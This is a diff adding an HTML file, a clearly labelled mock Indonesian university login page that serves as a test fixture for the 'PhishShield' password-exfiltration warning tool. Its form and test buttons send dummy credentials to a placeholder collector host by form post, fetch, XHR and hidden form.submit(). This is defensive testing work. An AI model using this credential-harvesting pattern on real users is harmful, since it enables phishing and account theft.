@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Portal Akademik (DEMO)</title>
+  <!--
+    Halaman login TIRUAN untuk demo PhishShield.
+    Sengaja generik: tidak meniru logo/tampilan kampus atau situs asli mana pun.
+    Disajikan oleh demo/server.py, yang mengganti {{COLLECTOR_URL}}.
+  -->
+  <style>
+    * { box-sizing: border-box; }
+    body { margin: 0; min-height: 100vh; background: #eef1f6; color: #1f2937; font: 15px/1.5 system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; }
+    .ribbon { padding: 8px 16px; background: #fde68a; color: #78350f; font-size: 13px; font-weight: 600; text-align: center; }
+    main { width: min(380px, calc(100% - 32px)); margin: 48px auto; padding: 28px; background: #fff; border-radius: 14px; box-shadow: 0 10px 30px rgba(15, 23, 42, 0.1); }
+    h1 { margin: 0; font-size: 22px; }
+    .sub { margin: 4px 0 20px; color: #6b7280; font-size: 13px; }
+    label { display: block; margin-bottom: 14px; font-size: 13px; font-weight: 600; }
+    input { display: block; width: 100%; margin-top: 6px; padding: 10px 12px; border: 1px solid #d1d5db; border-radius: 8px; font: inherit; }
+    button { width: 100%; padding: 11px; border: 0; border-radius: 8px; background: #1d4ed8; color: #fff; font: inherit; font-weight: 600; cursor: pointer; }
+    button:hover { background: #1e40af; }
+    details { margin-top: 24px; padding-top: 16px; border-top: 1px solid #e5e7eb; }
+    summary { cursor: pointer; color: #4b5563; font-size: 13px; font-weight: 600; }
+    .tests { display: grid; gap: 8px; margin-top: 12px; }
+    .tests button { background: #f3f4f6; color: #1f2937; font-size: 13px; text-align: left; }
+    .tests button:hover { background: #e5e7eb; }
+    .tests small { display: block; color: #6b7280; font-weight: 400; }
+    pre { margin: 12px 0 0; padding: 10px; overflow-x: auto; background: #111827; color: #d1fae5; border-radius: 8px; font-size: 12px; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <div class="ribbon">HALAMAN DEMO PhishShield · tiruan lokal · jangan masukkan data asli</div>
+
+  <main>
+    <h1>Portal Akademik</h1>
+    <p class="sub">Universitas Contoh · Single Sign-On</p>
+
+    <!-- Skenario utama: form HTML biasa yang mengirim ke domain lain -->
+    <form action="{{COLLECTOR_URL}}/collect" method="POST">
+      <label>Email kampus
+        <input type="email" name="email" placeholder="nama@kampus.example" autocomplete="off" required>
+      </label>
+      <label>Password
+        <input type="password" name="password" autocomplete="off" required>
+      </label>
+      <button type="submit">Masuk</button>
+    </form>
+
+    <details>
+      <summary>Skenario uji lain</summary>
+      <div class="tests">
+        <button type="button" id="btn-fetch">fetch() ke collector<small>Harus muncul Transparency Alert</small></button>
+        <button type="button" id="btn-xhr">XMLHttpRequest ke collector<small>Harus muncul Transparency Alert</small></button>
+        <button type="button" id="btn-js-submit">form.submit() dari JavaScript<small>Harus muncul Transparency Alert</small></button>
+        <button type="button" id="btn-same">Kirim password ke server sendiri<small>Domain sama, harus diam</small></button>
+        <button type="button" id="btn-harmless">Kirim data tidak sensitif ke collector<small>Tidak ada password, harus diam</small></button>
+      </div>
+      <pre id="out">Hasil akan muncul di sini.</pre>
+    </details>
+  </main>
+
+  <script>
+    const COLLECTOR = '{{COLLECTOR_URL}}';
+    const DUMMY = { email: 'demo@kampus.example', password: 'contoh-password-demo' };
+    const out = document.getElementById('out');
+    const show = (text) => { out.textContent = text; };
+
+    document.getElementById('btn-fetch').addEventListener('click', async () => {
+      try {
+        const res = await fetch(`${COLLECTOR}/collect`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(DUMMY),
+        });
+        show(`fetch terkirim: ${await res.text()}`);
+      } catch (err) {
+        show(`fetch gagal / dibatalkan: ${err.message}`);
+      }
+    });
+
+    document.getElementById('btn-xhr').addEventListener('click', () => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', `${COLLECTOR}/collect`);
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.onload = () => show(`XHR terkirim: ${xhr.responseText}`);
+      xhr.onerror = () => show('XHR gagal / dibatalkan');
+      xhr.send(new URLSearchParams(DUMMY).toString());
+    });
+
+    document.getElementById('btn-js-submit').addEventListener('click', () => {
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = `${COLLECTOR}/collect`;
+      form.hidden = true;
+      for (const [name, value] of Object.entries(DUMMY)) {
+        const input = document.createElement('input');
+        input.type = name === 'password' ? 'password' : 'text';
+        input.name = name;
+        input.value = value;
+        form.append(input);
+      }
+      document.body.append(form);
+      show('form.submit() dipanggil…');
+      form.submit();
+    });
+
+    document.getElementById('btn-same').addEventListener('click', async () => {
+      const res = await fetch('/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(DUMMY),
+      });
+      show(`same-domain terkirim tanpa peringatan: ${await res.text()}`);
+    });
+
+    document.getElementById('btn-harmless').addEventListener('click', async () => {
+      try {
+        const res = await fetch(`${COLLECTOR}/collect`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ theme: 'dark', language: 'id' }),
+        });
+        show(`data tidak sensitif terkirim tanpa peringatan: ${await res.text()}`);
+      } catch (err) {
+        show(`gagal: ${err.message}`);
+      }
+    });
+  </script>
+</body>
+</html>
